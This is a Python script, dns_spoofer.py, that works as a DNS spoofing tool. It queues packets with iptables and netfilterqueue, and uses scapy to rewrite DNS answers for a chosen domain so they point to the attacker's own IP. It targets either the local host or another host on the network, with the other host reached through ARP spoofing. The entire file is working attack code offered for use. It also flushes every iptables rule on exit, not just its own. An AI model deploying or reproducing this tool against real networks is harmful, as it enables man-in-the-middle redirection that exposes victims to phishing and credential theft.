#! usr/bin/env python3

"""
* Author:               Job Jacob
* Created:              02 December 2020 
* Filename:             dns_spoofer.py
* Example Run (Linux):  python3 dns_spoofer.py -d google.com -t local
"""

import argparse
import subprocess
import re
import socket
import netfilterqueue
import scapy.all as scapy

"""
* Function Name:  print_sample_usage_msg()
* Input:          None
* Output:         None
* Logic:          The function just prints a message on how to run the script with the required arguments.
* Example Call:   print_sample_usage_msg()
"""
def print_sample_usage_msg():
    print("\nSAMPLE USAGE:")
    print("[+] If the domain to be spoofed is www.google.com and the target system is local host, then run the script as:")
    print("\tpython3 " + __file__ + " -d google.com -t local")
    print("[+] If the domain to be spoofed is www.google.com and the target system is another host in the same network, then run the script as:")
    print("\tpython3 " + __file__ + " -d google.com -t other")
    print("Also make sure the ARP spoofing script is running in the case of other systems.\n")    

""" 
* Function Name:  get_dns_spoofer_args()
* Input:          None
* Output:         args.domain (string): The domain whose DNS table entry should be changed.
*                 args.target (string): Specifies whether we are trying to spoof the DNS for the local system or another system in the network. 
* Logic:          The function parses the parameters passed to the script and verifies if all the required parameters are present.
* Example Call:   domain, target = get_dns_spoofer_args()
"""
def get_dns_spoofer_args():
    parser = argparse.ArgumentParser()                                  
    parser.add_argument("-d", "--domain", type=str, help="the domain whose DNS table entry should be changed (required)")
    parser.add_argument("-t", "--target", type=str, help="Either 'local' or 'other'. Specifies whether we are trying to spoof the DNS for the local system or another system in the network. (required)")
    args = parser.parse_args()

    if((args.domain == None) and (args.target == None)):
        print("\nError: Domain name and target missing!! Pass the domain name and target (local/other) as an argument to the script.")
        print_sample_usage_msg()        

    elif(args.domain == None):
        print("\nError: Domain name missing!! Pass the domain name as an argument to the script.")
        print_sample_usage_msg()

    elif(args.target == None):
        print("\nError: Target missing!! Pass the target (local/other) as an argument to the script.")
        print_sample_usage_msg()

    return args.domain, args.target

""" 
* Function Name:  get_domain_ip()
* Input:          domain (string): The domain whose DNS table entry should be changed.
* Output:         domain_ip (string): The IP address corresponding to the given domain name.
* Logic:          The function uses a regular expression to search and retreive the IP address of the domain from the output of the ping subprocess call.
* Example Call:   domain_ip = get_domain_ip("google.com")
"""
def get_domain_ip(domain):
    try:
        ping_result = subprocess.check_output(["sudo", "ping", "-c", "1", domain])
    
    except Exception:
        return None

    ip_reg_exp = "(25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)"
    domain_ip = re.search(ip_reg_exp, ping_result.decode('utf-8'))

    return domain_ip.group(0)

""" 
* Function Name:  get_my_ip()
* Input:          None
* Output:         my_ip (string): The IP address of the system running this code.
* Logic:          The function uses socket module to get the IP address of the system running this script.
* Example Call:   my_ip = get_my_ip()
"""
def get_my_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        my_ip = s.getsockname()[0]
    
    except Exception:
        my_ip = "127.0.0.1"
    
    finally:
        s.close()

    return my_ip

""" 
* Function Name:  create_packet_queue()
* Input:          target (string): Specifies whether the target is our local system or another system in the network. 
* Output:         1 if the packet queue is created successfully or else 0
* Logic:          Creating a packet queue in the system using subprocessor calls so that the packets will move out only after they 
*                 are modified by our script.
* Example Call:   created = create_packet_queue("local")
"""
def create_packet_queue(target):
    if(target == "local"):
        subprocess.call("sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
        subprocess.call("sudo iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)
        return 1
    
    elif(target == "other"):
        subprocess.call("sudo iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
        return 1

    return 0

""" 
* Function Name:  flush_packet_queue()
* Input:          None
* Output:         None
* Logic:          The function is used to remove all the created packet queues.
* Example Call:   flush_packet_queue()
"""
def flush_packet_queue():
    subprocess.call("sudo iptables --flush", shell=True)

""" 
* Function Name:  process_packet()
* Input:          packet (string): The packet in the packet queue.
* Output:         None
* Logic:          A callback function used to process each packet in the queue. It modifies the DNS fields in the packets containing DNS responses
*                 for the given domain and sends the modified packet to the target.
* Example Call:   process_packet(packet)
"""
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if(scapy_packet.haslayer(scapy.DNSRR)):
        qname = scapy_packet[scapy.DNSQR].qname

        if(domain in qname.decode('utf-8')):
            answer = scapy.DNSRR(rrname=qname, rdata=my_ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del(scapy_packet[scapy.IP].len)
            del(scapy_packet[scapy.IP].chksum)
            del(scapy_packet[scapy.UDP].chksum)
            del(scapy_packet[scapy.UDP].len)

            packet.set_payload(bytes(scapy_packet))

            print(domain + " SPOOFED...")
    
    packet.accept()


if __name__ == "__main__":
    domain, target = get_dns_spoofer_args()
    
    if((domain != None) and (target != None)):
        domain_ip = get_domain_ip(domain)

        if(domain_ip == None):
            print("\nWe couldn't retrieve the IP address corresponding to the given domain.")
            print("Check if the entered domain name is correct and try again.\n")

        else:
            my_ip = get_my_ip()

            try:
                created = create_packet_queue(target)
                
                if(created):
                    print("\nStarting DNS SPOOF...\n")

                    queue = netfilterqueue.NetfilterQueue()
                    queue.bind(0, process_packet)
                    queue.run()

                else:
                    print("\nERROR: Please specify a valid target. The target should be either 'local' or 'other'.")
                    print_sample_usage_msg()

            except KeyboardInterrupt: 
                print("\n\nStopping SPOOF...")

            finally:
                if(created):
                    print("Flushing created IP queues...")
                    flush_packet_queue()
                    print("\nDONE.\n")
